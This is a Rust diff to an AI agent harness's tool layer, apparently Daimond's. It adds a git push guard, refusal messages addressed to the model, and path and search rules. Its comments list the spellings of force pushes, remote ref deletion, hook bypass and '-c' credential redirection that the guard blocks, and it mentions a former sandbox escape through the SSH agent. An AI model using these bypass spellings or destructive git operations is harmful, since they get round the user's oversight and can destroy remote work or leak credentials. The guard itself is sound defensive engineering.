+///   `--force-with-lease=main` is caught; `--` is honoured, and what follows it is still checked
+///   as a refspec, because `git push origin -- +main` forces just as hard.
+/// * **Move the force into configuration.**  `-c push.default=…` cannot force, but `-c` is
+///   refused on a push anyway, because configuration is what carries the credential.
+/// * **Move the force into the refspec.**  `+main:main` and `:main` are the two spellings, and
+///   both are refused.
+/// * **Push somewhere else.**  Only `origin`, and the credential is scoped to one host besides.
+///
+/// What it does NOT cover: a repository that already holds working credentials of its own, where
+/// a forced push would succeed without anything from Daimond.  That is the hand's to refuse, and
+/// the same list belongs in `hand/src/exec.rs`.
+///
+/// # Arguments
+/// * `argv` - The command, as the model wrote it.
+pub fn git_guard(argv: &[String]) -> GitCall {
+    if argv.is_empty() {
+        return GitCall::Other;
+    }
+    let prog = argv[0].rsplit('/').next().unwrap_or(argv[0].as_str());
+    if prog != "git" {
+        return GitCall::Other;
+    }
+    // Git's own options, then the subcommand. `pre` is kept because a push is refused for some of
+    // them, and finding the subcommand at all needs the same walk.
+    let mut i = 1;
+    let mut pre: Vec<&str> = Vec::new();
+    let mut sub: Option<&str> = None;
+    while i < argv.len() {
+        let a = argv[i].as_str();
+        if !a.starts_with('-') {
+            sub = Some(a);
+            i += 1;
+            break;
+        }
+        pre.push(a);
+        i += if GIT_OPT_VALUE.contains(&a) { 2 } else { 1 };
+    }
+    let sub = match sub {
+        Some(s) => s,
+        None    => return GitCall::Other, // `git`, `git --version`: nothing to guard.
+    };
+    let rest: Vec<&str> = argv.get(i..).unwrap_or(&[]).iter().map(|s| s.as_str()).collect();
+    // The hook bypass, on every subcommand that has one. `--` ends git's options everywhere, and
+    // what follows it is a path or a pathspec.
+    if rest.iter().take_while(|a| **a != "--").any(|a| *a == "--no-verify") {
+        return GitCall::Refuse(no_verify_refusal(sub, "--no-verify"));
+    }
+    // `-n` is `--no-verify` on a commit and `--dry-run` on a push, so it is refused on exactly one
+    // of them. Read as a cluster, because `git commit -an` is the same request as `git commit -n`.
+    if sub == "commit" {
+        for a in rest.iter().take_while(|a| **a != "--") {
+            if a.starts_with('-') && !a.starts_with("--") && a[1..].contains('n') {
+                return GitCall::Refuse(no_verify_refusal("commit", a));
+            }
+        }
+    }
+    if sub != "push" {
+        return GitCall::Other;
+    }
+    for a in &pre {
+        if let Some(name) = git_opt_refused(a) {
+            return GitCall::Refuse(fmt!(
+                "Refused: '{}' before 'push' sets git's configuration for this one command, and a \
+                Daimond push carries its own -- which host the credential goes to, which \
+                protocols may be used, and whether a program in the repository runs. Something \
+                able to add to that could send the credential somewhere else, so it is refused \
+                rather than merged. Run the push without it.", name));
+        }
+    }
+    // The push's own arguments. Positionals are collected rather than checked in place, because
+    // which one is the remote depends on how many options ate a value first.
+    let mut positional: Vec<&str> = Vec::new();
+    let mut j = 0;
+    let mut ended = false;
+    while j < rest.len() {
+        let a = rest[j];
+        if ended {
+            positional.push(a);
+            j += 1;
+            continue;
+        }
+        if a == "--" {
+            ended = true;
+            j += 1;
+            continue;
+        }
+        if a.starts_with("--") {
+            let name = a.split('=').next().unwrap_or(a);
+            if let Some(why) = push_long_refused(name) {
+                return GitCall::Refuse(why);
+            }
+            // The one allowed long option that takes a separate value; the rest either take none
+            // or are refused above.
+            j += if name == "--push-option" && !a.contains('=') { 2 } else { 1 };
+            continue;
+        }
+        if a.starts_with('-') && a.len() > 1 {
+            let flags = &a[1..];
+            if flags.contains('f') {
+                return push_cluster_refusal(a, 'f', "forces the push");
+            }
+            if flags.contains('d') {
+                return push_cluster_refusal(a, 'd', "deletes the ref on the remote");
+            }
+            // `-o` is `--push-option`, and its value follows unless it is stuck to the cluster.
+            j += if flags.ends_with('o') { 2 } else { 1 };
+            continue;
+        }
+        positional.push(a);
+        j += 1;
+    }
+    for (n, p) in positional.iter().enumerate() {
+        let refused = if n == 0 { push_remote_refused(p) } else { push_refspec_refused(p) };
+        if let Some(why) = refused {
+            return GitCall::Refuse(why);
+        }
+    }
+    GitCall::Push
+}
+
+/// The refusal a short-option cluster gets, naming the letter rather than the cluster.
+///
+/// `-uf` is refused for its `f`, and a model told only that `-uf` was refused would reasonably try
+/// `-u -f`.
+///
+/// # Arguments
+/// * `cluster` - The argument as written.
+/// * `letter` - The letter that decided it.
+/// * `does` - What that letter does, in a clause.
+fn push_cluster_refusal(cluster: &str, letter: char, does: &str) -> GitCall {
+    GitCall::Refuse(push_refusal(
+        &fmt!("-{}", letter),
+        &fmt!("{} -- it is in '{}', and a short option carries every letter written after the \
+            dash", does, cluster)))
+}
+
+/// What [`Tool::run`] must do about a command, once the turn's fence is known.
+///
+/// The three-line call site in `Tool::run` is wasm-only and therefore cannot be unit-tested at
+/// all, so as little as possible lives there: this function is the whole decision -- the guard,
+/// the network, and whether a credential exists -- and it is pure, native, and tested.
+#[derive(Clone, Debug, Eq, PartialEq)]
+pub enum GitStep {
+    /// Run it as any other command, with no environment of its own.
+    Plain,
+    /// Run it with these extra environment pairs, appended after any toolkit's.
+    WithEnv(Vec<(String, String)>),
+    /// Do not run it, and say this.
+    Refuse(String),
+}
+
+/// Everything `run` decides about a git command, in one place.
+///
+/// The order is the order the sentences must arrive in.  The guard comes first, because a refused
+/// push should be refused whether or not a credential exists and whether or not this turn has the
+/// network -- a model told "no network" about a `--force` would take the network away as the thing
+/// to fix.  The network comes next, because a push with none cannot go out however well configured
+/// it is.  Only then is the credential looked for.
+///
+/// # Arguments
+/// * `argv` - The command, as the model wrote it.
+/// * `root` - The absolute folder the hand was granted.
+/// * `no_net` - Whether this turn's fence refuses the network.
+pub fn git_step(argv: &[String], root: &str, no_net: bool) -> GitStep {
+    match git_guard(argv) {
+        GitCall::Refuse(why) => GitStep::Refuse(why),
+        GitCall::Other       => GitStep::Plain,
+        GitCall::Push        => {
+            if no_net {
+                return GitStep::Refuse(push_no_net_refusal());
+            }
+            match push_env(root) {
+                Some(e) => GitStep::WithEnv(e),
+                None    => GitStep::Refuse(push_unconfigured_refusal()),
+            }
+        },
+    }
+}
+
+/// The refusal a push gets where the user has configured no credential.
+///
+/// Said in full rather than left to fail at the remote, because the failure it would otherwise
+/// produce is `Permission denied (publickey)`, which sends a model looking for an SSH key that
+/// cannot exist here -- and no amount of retrying will make one.
+pub fn push_unconfigured_refusal() -> String {
+    fmt!(
+        "Refused: there is no push credential set, so this push cannot be authenticated. Pushing \
+        over SSH is not possible from inside Daimond's compartment at all: the keys and the agent \
+        live outside it, and reaching the agent needs a channel the machine hand refuses \
+        unconditionally, because that channel was once a way out of the compartment entirely. \
+        Daimond pushes over HTTPS with a token the user sets once in Settings; nothing you can \
+        run will substitute for it. Tell them what is ready to push, and carry on.")
+}
+
+/// The refusal a push gets on a turn that has lost the network.
+///
+/// Distinct from the ordinary no-network note, which arrives AFTER the command has run: a push
+/// with no network fails somewhere inside git's transport with a message about resolving a host,
+/// and the cause is a rule this turn is under rather than anything about the repository.
+pub fn push_no_net_refusal() -> String {
+    fmt!(
+        "Refused: this turn has read something from outside the user's own files, so every \
+        command in it runs with the network refused -- and a push has nowhere to go without it. \
+        This is not a fault in the repository and no retry will change it. Say what is ready to \
+        push, and it can go out on a fresh message.")
+}
+
+/// The one sentence a daimon is told about pushing, or nothing where no credential is held.
+///
+/// Facts and no advice, as the rest of the machine briefing is: what works, what is refused, and
+/// the one surprise (no hooks) that would otherwise read as a broken repository.
+pub fn push_note() -> String {
+    match push_host() {
+        None    => String::new(),
+        Some(h) => fmt!(
+            "\nGit: 'git push' reaches {} over HTTPS using a credential Daimond holds; you never \
+            see it and cannot set it, and an SSH remote is rewritten for the push only. \
+            Only a fast-forward push, to 'origin' and nothing else: --force, --force-with-lease, --delete, \
+            --mirror, --prune, a '+' refspec, --no-verify and any other remote are refused. A \
+            push runs no hooks; a commit runs all of them.", h),
+    }
+}
+
+
 /// Shared context every tool executes against.
 #[derive(Clone, Debug)]
 pub struct ToolContext {
@@ -1903,20 +2767,37 @@ impl ToolContext {
     /// which no allow-list can contain.  Every command was then refused as "not in this Diamond's
     /// workspace" the moment a scope was set, and a fence nothing can run inside is not a fence but
     /// an outage (`hand/REVIEW.md` §1.18).
+    ///
+    /// **A path naming Daimond's own store is skipped**, whichever case it arrives in.  A Diamond's
+    /// own directory is in the browser's storage and not on the machine at all (see
+    /// [`is_store_path`]), so `<granted-root>/diamonds/<id>` is a directory the hand cannot
+    /// canonicalise and every command would be refused for a reason that points at the wrong thing.
+    /// A Diamond therefore runs in its first ATTACHED path, and one with no attachment has nowhere
+    /// on the machine to run at all -- which [`Tool::Run`] says in those words rather than sending
+    /// the hand a directory it will not find.
     pub fn default_cwd(&self) -> String {
         let prefix = normalise(&self.path_prefix);
-        if !prefix.is_empty() {
+        if !prefix.is_empty() && !is_store_path(&prefix) {
             return prefix;
         }
         for b in &self.no_write {
             if let Bound::OnlyUnder(p) = b {
                 let n = normalise(p);
-                if !n.is_empty() {
+                if !n.is_empty() && !is_store_path(&n) {
                     return n;
                 }
             }
         }
         String::new()
+    }
+
+    /// Whether this turn declared an allow-list at all, i.e. whether it is scoped to a Diamond.
+    ///
+    /// The DECLARATION decides, not what survived it: a scope that named only Daimond's own store
+    /// is still a scope, and reading it as an unscoped turn would start its commands at the granted
+    /// root -- the whole grant, for a turn the user confined to one Diamond.
+    pub fn is_scoped(&self) -> bool {
+        self.no_write.iter().any(|b| matches!(b, Bound::OnlyUnder(_)))
     }
 
     /// Whether an allow-list is declared at all, and if so whether `path` is inside it.
@@ -2051,11 +2932,94 @@ const GLOB_PATHS_MAX: usize = 500;
 /// opened.  A slow search is a nuisance; a silent miss is a wrong answer.  These five are
 /// machine-generated or enormous, they are named in the result whenever one was passed over,
 /// and `"all":true` includes them.
+///
+/// **This is a rule about WALKING and never about reading.**  Nothing here refuses a path a caller
+/// named: `file_read` on `.git/HEAD` opens it, and a walk that starts inside one of these
+/// directories walks it.  The two questions are different -- "should a search of the whole tree
+/// descend into the object store" is not "may this agent read the reflog" -- and answering the
+/// second with the first would leave an agent unable to establish what state a repository is in.
 const SKIP_DIRS: [&str; 5] = [".git", ".hg", ".svn", "node_modules", "target"];
 
-/// Whether this directory name is one the walk passes over by default.
-fn is_skipped_dir(name: &str) -> bool {
-    SKIP_DIRS.contains(&name)
+/// Whether `text` names `dir` as a WHOLE path segment.
+///
+/// Segment-wise, so `.gitignore` and `**/*.git` do not count as naming `.git`, and
+/// `code/rust/fe2o3/.git`, `.git/**` and `**/.git/logs/*` all do.  This is the same
+/// whole-segment rule [`under`] uses, for the same reason: a spelling that merely starts with a
+/// name is not that name.
+///
+/// # Arguments
+/// * `text` - A path or glob, exactly as the caller wrote it.
+/// * `dir` - One of [`SKIP_DIRS`].
+fn names_segment(text: &str, dir: &str) -> bool {
+    text.replace('\\', "/").split('/').any(|s| s == dir)
+}
+
+/// Which of [`SKIP_DIRS`] one call actually passes over.
+///
+/// Three states and not two, which is the whole point of the type.  By default a walk passes over
+/// all five.  `"all":true` walks all five.  And a caller that **names one** -- in `path`, in
+/// `pattern`, or in `glob` -- walks that one and no others, because asking for `.git/**` and being
+/// told "no paths matched" is a wrong answer, while walking `node_modules` as well would be the
+/// slow answer nobody asked for.
+///
+/// The named case exists because the tools are the only way an agent can see a repository's own
+/// state.  `file_read` on `.git/HEAD` already worked -- the skip was never a refusal -- but
+/// `file_glob` with `pattern:".git/refs/**"` came back empty, which reads exactly like a missing
+/// directory and sent agents hunting for a block that was not there.
+#[derive(Clone, Copy, Debug, Eq, PartialEq)]
+pub struct Skips {
+    /// One flag per entry of [`SKIP_DIRS`], set where the walk passes that directory over.
+    on:  [bool; SKIP_DIRS.len()],
+    /// Whether the caller asked for everything, which is why a name was not needed.
+    all: bool,
+}
+
+impl Skips {
+
+    /// The rule for one call.
+    ///
+    /// # Arguments
+    /// * `all` - Whether the call passed `"all":true`.
+    /// * `named` - The `path`, `pattern` and `glob` the caller wrote, in their own spelling.
+    pub fn new(all: bool, named: &[&str]) -> Self {
+        let mut on = [!all; SKIP_DIRS.len()];
+        if !all {
+            for (i, d) in SKIP_DIRS.iter().enumerate() {
+                if named.iter().any(|t| names_segment(t, d)) {
+                    on[i] = false;
+                }
+            }
+        }
+        Self { on, all }
+    }
+
+    /// Everything, walked: the rule a caller that named nothing gets.
+    pub fn default_rule() -> Self {
+        Self::new(false, &[])
+    }
+
+    /// Whether the walk passes over a directory of this name.
+    ///
+    /// # Arguments
+    /// * `name` - The directory's own name, without its parents.
+    pub fn skips(&self, name: &str) -> bool {
+        SKIP_DIRS.iter().position(|d| *d == name).map(|i| self.on[i]).unwrap_or(false)
+    }
+
+    /// The names still passed over, so the result names what it did not look in rather than
+    /// reciting all five whatever happened.
+    pub fn passed_over(&self) -> Vec<&'static str> {
+        SKIP_DIRS.iter().enumerate().filter(|(i, _)| self.on[*i]).map(|(_, d)| *d).collect()
+    }
+
+    /// The names walked because the caller wrote one of them, which is worth saying: it is the
+    /// difference between "there is nothing there" and "you asked and this is what is there".
+    pub fn by_name(&self) -> Vec<&'static str> {
+        if self.all {
+            return Vec::new();
+        }
+        SKIP_DIRS.iter().enumerate().filter(|(i, _)| !self.on[*i]).map(|(_, d)| *d).collect()
+    }
 }
 
 /// Read a whole-number argument, tolerating the quoted form models routinely send.
@@ -2195,8 +3159,8 @@ struct SearchOpts {
     skip:   usize,
     /// The most matches to report.
     limit:  usize,
-    /// Whether to walk the build and version-control directories too.
-    all:    bool,
+    /// Which of the build and version-control directories this call passes over.
+    walk:   Skips,
 }
 
 /// What a search did not look at, so the result can say so rather than answer as though it had
@@ -2265,7 +3229,14 @@ fn search_opts(args: &str) -> Outcome<SearchOpts> {
         after:  uint_arg(args, "after",  0, SEARCH_CONTEXT_MAX),
         skip:   uint_arg(args, "offset", 0, usize::MAX),
         limit:  uint_arg(args, "limit", SEARCH_MATCHES_DEFAULT, SEARCH_MATCHES_MAX).max(1),
-        all:    extract_json_bool(args, "all").unwrap_or(false),
+        // Read from the strings the caller wrote and not from the compiled `Glob`, which has
+        // forgotten its own source text by the time it gets here.
+        walk:   Skips::new(
+            extract_json_bool(args, "all").unwrap_or(false),
+            &[
+                &extract_json_string(args, "path").unwrap_or_default(),
+                &extract_json_string(args, "glob").unwrap_or_default(),
+            ]),
     })
 }
 
@@ -2361,8 +3332,9 @@ fn search_notes(opts: &SearchOpts, stats: &SearchStats) -> String {
     let mut missed: Vec<String> = Vec::new();
     if stats.skipped > 0 {
         missed.push(fmt!(
-            "{} director(ies) named {} (pass \"all\":true to search them too)",
-            stats.skipped, SKIP_DIRS.join(", ")));
+            "{} director(ies) named {} (pass \"all\":true to search them too, or name one in \
+            'path' or 'glob' to search just that one)",
+            stats.skipped, opts.walk.passed_over().join(", ")));
     }
     if stats.too_big > 0 {
         missed.push(fmt!("{} file(s) larger than {} bytes", stats.too_big, SEARCH_MAX_FILE));
@@ -2383,6 +3355,14 @@ fn search_notes(opts: &SearchOpts, stats: &SearchStats) -> String {
     }
     if !missed.is_empty() {
         out.push_str(&fmt!("\n[file_search] NOT searched: {}.", missed.join("; ")));
+    }
+    // See `glob_output`: an empty result from a directory the caller named for itself has to say
+    // that it was looked in, or it reads as a directory that is not there.
+    let named = opts.walk.by_name();
+    if !named.is_empty() {
+        out.push_str(&fmt!(
+            "\n[file_search] SEARCHED by name: {} -- normally passed over, searched here because \
+            you named it.", named.join(", ")));
     }
     if stats.capped {
         out.push_str(&fmt!(
@@ -2615,14 +3595,31 @@ impl Tool {
     /// * `args_json` - The tool's arguments, as the model sent them.
     /// * `ctx` - The context whose bounds the call is checked against.
     fn guard(&self, args_json: &str, ctx: &ToolContext) -> Outcome<Option<String>> {
-        for path in res!(Self::write_targets(self, args_json)) {
-            if !ctx.may_write(&path) {
-                return Ok(Some(ctx.refusal(&path, true)));
+        let writes = res!(Self::write_targets(self, args_json));
+        let read   = res!(Self::read_target(self, args_json));
+        // `artefact_add` and `typst_compile` name a path that is neither a bounds target nor a
+        // read the guard checks -- the compile's PDF is the write it is judged on -- so both are
+        // added here, because the convention applies to every path a call names.
+        let named = match self {
+            Tool::ArtefactAdd | Tool::TypstCompile => Some(res!(Self::arg(args_json, "path"))),
+            _                                      => None,
+        };
+        // The convention BEFORE the bounds: an absolute path measured against an allow-list is
+        // refused as out of scope, which sends the model hunting a permission problem it has not
+        // got, when what it wrote was simply the wrong kind of path.
+        for path in writes.iter().chain(read.iter()).chain(named.iter()) {
+            if let Some(refusal) = absolute_path_refusal(self, path) {
+                return Ok(Some(refusal));
             }
         }
-        if let Some(path) = res!(Self::read_target(self, args_json)) {
-            if !ctx.may_read(&path) {
-                return Ok(Some(ctx.refusal(&path, false)));
+        for path in &writes {
+            if !ctx.may_write(path) {
+                return Ok(Some(ctx.refusal(path, true)));
+            }
+        }
+        if let Some(path) = &read {
+            if !ctx.may_read(path) {
+                return Ok(Some(ctx.refusal(path, false)));
             }
         }
         Ok(None)
@@ -2711,19 +3708,19 @@ impl Tool {
     /// One-line description for the LLM.
     pub fn description(&self) -> &'static str {
         match self {
-            Tool::FileRead    => "Read a UTF-8 text file from the workspace. Every line comes back prefixed with its number and a TAB. That prefix is this tool's, NOT part of the file: strip it before you quote a line into file_edit's old_string, or the edit will not match. A file too long to return at once is returned in pages -- 'offset' is the 1-based line to start at and 'limit' how many lines to take -- and whenever a page is not the whole file the result says which lines it holds, how many the file has, and the exact call that fetches the next page. Believe that notice: a file you have half read is a file you do not know. Read a file before you edit it.",
+            Tool::FileRead    => "Read a UTF-8 text file from the workspace. Paths here, and in every other file tool, are relative to the workspace: 'src/main.rs', not '/home/you/project/src/main.rs' -- the workspace is not the machine's filesystem, so an absolute path is refused rather than followed. Every line comes back prefixed with its number and a TAB. That prefix is this tool's, NOT part of the file: strip it before you quote a line into file_edit's old_string, or the edit will not match. A file too long to return at once is returned in pages -- 'offset' is the 1-based line to start at and 'limit' how many lines to take -- and whenever a page is not the whole file the result says which lines it holds, how many the file has, and the exact call that fetches the next page. Believe that notice: a file you have half read is a file you do not know. Read a file before you edit it.",
             Tool::FileWrite   => "Create or overwrite a file in the workspace with the given content.",
             Tool::FileEdit    => "Replace an exact, unique substring in a workspace file. 'old_string' must be the file's own bytes: file_read prefixes each line with its number and a TAB, and those characters are not in the file, so strip them from anything you copy out of a read. Give enough surrounding text to be unique -- the edit is refused, not guessed at, when the string appears twice or not at all.",
             Tool::FileList    => "List the entries of a workspace directory. One directory, no recursion: to find files by name across a tree use file_glob, and to find files by their contents use file_search.",
-            Tool::FileSearch  => "Search the contents of workspace files and return the matching lines as 'path:line:text', ripgrep's own format. 'query' is a REGULAR EXPRESSION by default -- '.', '*', '+', '?', '[]', '()', '|', '^', '$', '\\d', '\\w', '\\s' and '\\b' all mean what they usually do -- so pass \"fixed\":true when you want the text matched literally, and set \"ignore_case\":true to fold case. Narrow it with \"glob\" (e.g. '**/*.rs', '*.{md,typ}') and \"path\", and ask for surrounding lines with \"before\" and \"after\". It returns at most 200 matches unless you raise \"limit\"; when it stops early it SAYS so and gives you the \"offset\" to page on with, and it also says which directories, oversized files and non-text files it did not look inside -- read that notice before concluding something is absent. It walks .github, .cargo and every other dotted directory; only .git, .hg, .svn, node_modules and target are passed over, and \"all\":true includes those. IT READS EVERY FILE IT SEARCHES, so over a large tree it is slow. Where the 'run' tool is available -- it needs Daimond's machine hand, and refuses in plain English where there is none -- 'rg' is far faster and worth trying FIRST on anything the size of a source repository: run [\"rg\",\"-n\",\"pattern\",\"path\"]. Two things can go wrong with that and neither is worth fighting: run itself REFUSES where there is no hand, and where there is one 'rg' may simply not be installed, in which case the command fails to start. Either way, come straight back to this tool rather than hunting for a way around it.",
-            Tool::FileGlob    => "Find files by PATH, without reading any of them: give a glob and get back the paths that match, most recently modified first where this build can see modification times. '*' matches within one path segment, '**' matches any number of segments, '?' matches one character, '[a-z]' a character from a set, and '{a,b}' either alternative. A pattern with no '/' in it is matched against the file NAME anywhere under the search path, so '*_test.rs' finds every test file in the tree; a pattern with a '/' is matched against the whole relative path, as in 'src/**/*.rs'. This is the tool for 'where is X' and for taking stock of a codebase; file_search is for 'which lines say X'. It walks dotted directories, passing over only .git, .hg, .svn, node_modules and target unless \"all\":true, and it says when it did.",
+            Tool::FileSearch  => "Search the contents of workspace files and return the matching lines as 'path:line:text', ripgrep's own format. 'query' is a REGULAR EXPRESSION by default -- '.', '*', '+', '?', '[]', '()', '|', '^', '$', '\\d', '\\w', '\\s' and '\\b' all mean what they usually do -- so pass \"fixed\":true when you want the text matched literally, and set \"ignore_case\":true to fold case. Narrow it with \"glob\" (e.g. '**/*.rs', '*.{md,typ}') and \"path\", and ask for surrounding lines with \"before\" and \"after\". It returns at most 200 matches unless you raise \"limit\"; when it stops early it SAYS so and gives you the \"offset\" to page on with, and it also says which directories, oversized files and non-text files it did not look inside -- read that notice before concluding something is absent. It walks .github, .cargo and every other dotted directory; only .git, .hg, .svn, node_modules and target are passed over, and \"all\":true includes those -- as does NAMING one, so \"path\":\".git\" or \"glob\":\".git/**\" searches the repository's own files and nothing else extra. IT READS EVERY FILE IT SEARCHES, so over a large tree it is slow. Where the 'run' tool is available -- it needs Daimond's machine hand, and refuses in plain English where there is none -- 'rg' is far faster and worth trying FIRST on anything the size of a source repository: run [\"rg\",\"-n\",\"pattern\",\"path\"]. Two things can go wrong with that and neither is worth fighting: run itself REFUSES where there is no hand, and where there is one 'rg' may simply not be installed, in which case the command fails to start. Either way, come straight back to this tool rather than hunting for a way around it.",
+            Tool::FileGlob    => "Find files by PATH, without reading any of them: give a glob and get back the paths that match, most recently modified first where this build can see modification times. '*' matches within one path segment, '**' matches any number of segments, '?' matches one character, '[a-z]' a character from a set, and '{a,b}' either alternative. A pattern with no '/' in it is matched against the file NAME anywhere under the search path, so '*_test.rs' finds every test file in the tree; a pattern with a '/' is matched against the whole relative path, as in 'src/**/*.rs'. This is the tool for 'where is X' and for taking stock of a codebase; file_search is for 'which lines say X'. It walks dotted directories, passing over only .git, .hg, .svn, node_modules and target unless \"all\":true, and it says when it did. Naming one walks it: 'path':'.git' or a pattern like '.git/refs/**' looks inside the repository's own directory, which is how you read HEAD, a reflog or a ref -- and file_read opens any of those by path regardless, since the skip is about walking and never about reading.",
             Tool::FileDelete  => "Delete a file, or a directory when recursive is true, from the workspace.",
             Tool::FileMove    => "Move or rename a file or directory within the workspace.",
             Tool::DirCreate   => "Create a directory in the workspace, and any parent directories it needs.",
             Tool::ArtefactAdd => "Record that a file already in the workspace is an artefact of this Diamond, so it is listed with the work rather than only sitting in the folder. Use it for files the user put there, or found, or wrote themselves -- anything this Diamond produced is recorded without being asked. Recording a file does not read it: read it as well if what it says belongs in the crystal.",
             Tool::FileFetch   => "Download one file from cloud storage onto this device, so the other file tools can reach it. The workspace is one set of files and this device holds as much of it as it can; file_list marks the rest 'in cloud storage', and file_read refuses them and says how big they are. This is the only thing that moves those bytes, and it may transfer a great deal of data at the user's expense — so fetch a file when you actually need its contents, one at a time, and never speculatively or in bulk. Once it has arrived, read it as you would any other file.",
             Tool::Shell       => "Run a shell command in the workspace and return its stdout/stderr and exit code.",
-            Tool::Run         => "Run one command on the user's machine and return its output and exit code. This is how you build, test, run a linter, or use any command-line tool. Give 'argv' as an ARRAY -- the program, then each argument separately: [\"cargo\",\"test\",\"--lib\"]. It is NOT a shell command line and there is no shell: a semicolon, a pipe, a redirection, a backtick, a '$(...)' or a '&&' is passed to the program as a literal argument and will not do what it does in a terminal. To feed a command some input use 'stdin'; to run somewhere else use 'cwd'; to chain two commands, call this tool twice and decide between them yourself, which is better anyway because you see the first result before choosing. It needs a companion program -- Daimond's machine hand -- that the user installs and approves once: a browser cannot start a process on its own. Where there is no hand, or where the hand says it cannot contain a command on that computer, this REFUSES and says which; believe the refusal, tell the user what you wanted to run, and carry on with the file tools. Where there is one, the command runs inside the folder they granted and not the rest of the machine. Whether it may reach the network, and whether the user is asked before it runs at all, is the permission mode they chose: the note about this computer says which, so read that rather than assuming either way. A command that fails is usually telling you something true: read its stderr before running it again.",
+            Tool::Run         => "Run one command on the user's machine and return its output and exit code. This is how you build, test, run a linter, or use any command-line tool. Give 'argv' as an ARRAY -- the program, then each argument separately: [\"cargo\",\"test\",\"--lib\"]. It is NOT a shell command line and there is no shell: a semicolon, a pipe, a redirection, a backtick, a '$(...)' or a '&&' is passed to the program as a literal argument and will not do what it does in a terminal, and '~' is not expanded either, so '~/x' asks for a directory actually named '~' and the command reports the path missing -- write every path in 'argv' out in full from '/'. 'cwd' is the one that goes the other way: it is workspace-relative, as the file tools' paths are, and an absolute one is refused rather than joined onto the workspace root. To feed a command some input use 'stdin'; to chain two commands, call this tool twice and decide between them yourself, which is better anyway because you see the first result before choosing. It needs a companion program -- Daimond's machine hand -- that the user installs and approves once: a browser cannot start a process on its own. Where there is no hand, or where the hand says it cannot contain a command on that computer, this REFUSES and says which; believe the refusal, tell the user what you wanted to run, and carry on with the file tools. Where there is one, the command runs inside the folder they granted and not the rest of the machine. Whether it may reach the network, and whether the user is asked before it runs at all, is the permission mode they chose: the note about this computer says which, so read that rather than assuming either way. A command that fails is usually telling you something true: read its stderr before running it again.",
             Tool::SpawnAgent  => "Dispatch a worker agent to carry out one bounded task in its own context, with the full workspace file tools. Call it once per agent; several calls in a single turn run in parallel. Each agent reports back a summary you can fold into the crystal.",
             Tool::WebOpen     => "Show a web page to the user in Daimond's Web panel. This makes the page VISIBLE; it does not mean you can operate it. Most sites refuse to be shown inside another page at all, and a page that is shown can still be beyond your reach unless a browser driver is attached. To READ a page's text, use web_fetch, which always works. To find out whether you can act on this one, call web_snapshot: if it refuses, believe the refusal and say so rather than guessing at clicks.",
             Tool::WebClose    => "Close the Web panel and let go of the page in it. Use this when the page is no longer needed; the user's screen is small and the panel takes up half of it. Every ref from an earlier web_snapshot is dead afterwards.",
@@ -2773,8 +3770,8 @@ impl Tool {
     /// The tool's JSON-Schema `parameters` object.
     fn parameters(&self) -> &'static str {
         match self {
-            Tool::FileRead => r#"{"type":"object","properties":{"path":{"type":"string","description":"Workspace-relative file path"},"offset":{"type":"integer","description":"1-based line number to start at (default 1). Use the offset the previous page's notice gave you."},"limit":{"type":"integer","description":"How many lines to return (default 2000, maximum 10000). Fewer are returned when the output budget runs out first, and the result says so."}},"required":["path"]}"#,
-            Tool::FileWrite => r#"{"type":"object","properties":{"path":{"type":"string","description":"Workspace-relative file path"},"content":{"type":"string","description":"Full file content"}},"required":["path","content"]}"#,
+            Tool::FileRead => r#"{"type":"object","properties":{"path":{"type":"string","description":"Workspace-relative file path, e.g. 'src/main.rs'; never absolute"},"offset":{"type":"integer","description":"1-based line number to start at (default 1). Use the offset the previous page's notice gave you."},"limit":{"type":"integer","description":"How many lines to return (default 2000, maximum 10000). Fewer are returned when the output budget runs out first, and the result says so."}},"required":["path"]}"#,
+            Tool::FileWrite => r#"{"type":"object","properties":{"path":{"type":"string","description":"Workspace-relative file path, e.g. 'src/main.rs'; never absolute"},"content":{"type":"string","description":"Full file content"}},"required":["path","content"]}"#,
             Tool::FileEdit => r#"{"type":"object","properties":{"path":{"type":"string"},"old_string":{"type":"string","description":"Exact substring to replace (must be unique)"},"new_string":{"type":"string","description":"Replacement text"}},"required":["path","old_string","new_string"]}"#,
             Tool::FileList => r#"{"type":"object","properties":{"path":{"type":"string","description":"Workspace-relative directory (default '.')"}}}"#,
             Tool::FileSearch => r#"{"type":"object","properties":{"query":{"type":"string","description":"Regular expression to search for, unless 'fixed' is true"},"path":{"type":"string","description":"Directory to search under (default '.')"},"glob":{"type":"string","description":"Only search files whose path matches this glob, e.g. '**/*.rs' or '*.{md,typ}'"},"fixed":{"type":"boolean","description":"Match 'query' as literal text rather than as a regular expression (default false)"},"ignore_case":{"type":"boolean","description":"Fold case when matching (default false)"},"before":{"type":"integer","description":"Lines of context to show before each match (default 0, maximum 20)"},"after":{"type":"integer","description":"Lines of context to show after each match (default 0, maximum 20)"},"offset":{"type":"integer","description":"Skip this many matches before reporting any, to page past an earlier call's limit"},"limit":{"type":"integer","description":"Most matches to report (default 200, maximum 1000)"},"all":{"type":"boolean","description":"Search .git, .hg, .svn, node_modules and target as well (default false)"}},"required":["query"]}"#,
@@ -2785,7 +3782,7 @@ impl Tool {
             Tool::ArtefactAdd => r#"{"type":"object","properties":{"path":{"type":"string","description":"Workspace-relative file to record as this Diamond's artefact"},"note":{"type":"string","description":"Optional: why it belongs to this Diamond, in a few words"}},"required":["path"]}"#,
             Tool::FileFetch => r#"{"type":"object","properties":{"path":{"type":"string","description":"Workspace-relative path of the file to bring down from cloud storage"}},"required":["path"]}"#,
             Tool::Shell => r#"{"type":"object","properties":{"command":{"type":"string","description":"Shell command to run"}},"required":["command"]}"#,
-            Tool::Run => r#"{"type":"object","properties":{"argv":{"type":"array","items":{"type":"string"},"description":"The program and each argument as a separate element, e.g. [\"cargo\",\"test\"]. Never a shell command line."},"cwd":{"type":"string","description":"Workspace-relative directory to run in (default: this Diamond's own directory)"},"stdin":{"type":"string","description":"Text written to the command's standard input, then closed"},"timeout_ms":{"type":"integer","description":"Hard limit in milliseconds (default 120000, maximum 900000)"}},"required":["argv"]}"#,
+            Tool::Run => r#"{"type":"object","properties":{"argv":{"type":"array","items":{"type":"string"},"description":"The program and each argument as a separate element, e.g. [\"cargo\",\"test\"]. Never a shell command line. A path in an argument is the machine's own: absolute, with no '~'."},"cwd":{"type":"string","description":"Workspace-relative directory to run in, e.g. 'src/api' (default: this Diamond's own directory). Never absolute."},"stdin":{"type":"string","description":"Text written to the command's standard input, then closed"},"timeout_ms":{"type":"integer","description":"Hard limit in milliseconds (default 120000, maximum 900000)"}},"required":["argv"]}"#,
